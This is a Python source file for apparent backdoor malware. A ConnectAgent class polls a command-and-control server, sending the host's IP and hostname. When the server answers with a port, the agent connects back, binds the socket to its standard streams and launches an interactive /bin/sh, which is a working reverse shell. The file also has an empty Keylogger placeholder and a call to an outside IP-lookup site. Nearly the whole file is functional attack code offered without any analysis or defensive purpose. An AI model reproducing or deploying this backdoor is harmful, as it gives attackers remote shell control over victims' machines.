#!/usr/bin/python3
#-*- coding: utf-8 -*-
# 
enc = "utf-8"

# Settings
# -----------------------
mac_key = 'aaaaaaaaaaa' # not implemented server side yet
cc_server = '127.0.0.1' 
cc_port   = 8088
cc_page   = '/' # for example /index.html or other/empty
# -----------------------
import socket
import hashlib
import os
import time
import subprocess
import urllib.parse
import urllib.request



class ConnectAgent:
    # Class for Back Connecter
    pollrate = 30
    def __init__(self, hostname, port, key):
        self.port=port
        self.key=key
        self.hostname=hostname
        self.ip=getRemoteIp() # why is this a byte string

    def setPollRate(self, newRate):
        self.pollrate = newRate

    def start(self):
    # Periodically poll the cc server and check its response. If the response indicates a port, backconnect to the given port on the cc server
        while True:
            p = self.pollControlServer()
            if p == 0: # repoll
                time.sleep(self.pollrate)
                continue
            elif p == -1: # some error
                return -1
            elif p > 65535: # error condition
                return -1
            else: # valid port was returned
                c_port = p
                try:
                    s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
                    s.connect((self.hostname,c_port))
                    os.dup2(s.fileno(),0)
                    os.dup2(s.fileno(),1)
                    os.dup2(s.fileno(),2)
                    proc=subprocess.call(["/bin/sh","-i"])
                    s.close()#TODO
                except:
                    s.close()
                    pass
            #print("Done")#TODO
            time.sleep(self.pollrate)

    def pollControlServer(self):
        thostname = socket.gethostname()
        mac = self.getMac(thostname)
        payload = {'ip':self.ip,'hostname':thostname,'mac':mac}
        url = 'http://'+self.hostname+":"+str(self.port)+cc_page+'?' + urllib.parse.urlencode(payload)
        try:
            with urllib.request.urlopen(url) as f:
                if f.getcode() == 403:
                    return 0
                elif f.getcode() == 200:
                    return int(f.read())
                else:
                    return -1
        except: 
            return 0

    def getMac(self, hostname):
        message = self.ip + ":" + hostname + ":" + self.key
        hashed = hashlib.sha256(message.encode(enc)).hexdigest() # sha256(ip:port:hostname:key)
        return hashed

class Keylogger:
    pass


def main():
    b = ConnectAgent(cc_server, cc_port, mac_key)
    b.start()

def getRemoteIp():
    with urllib.request.urlopen('http://myip.dnsdynamic.org/') as r:
        return str(r.read())

if __name__ == "__main__":
    main()

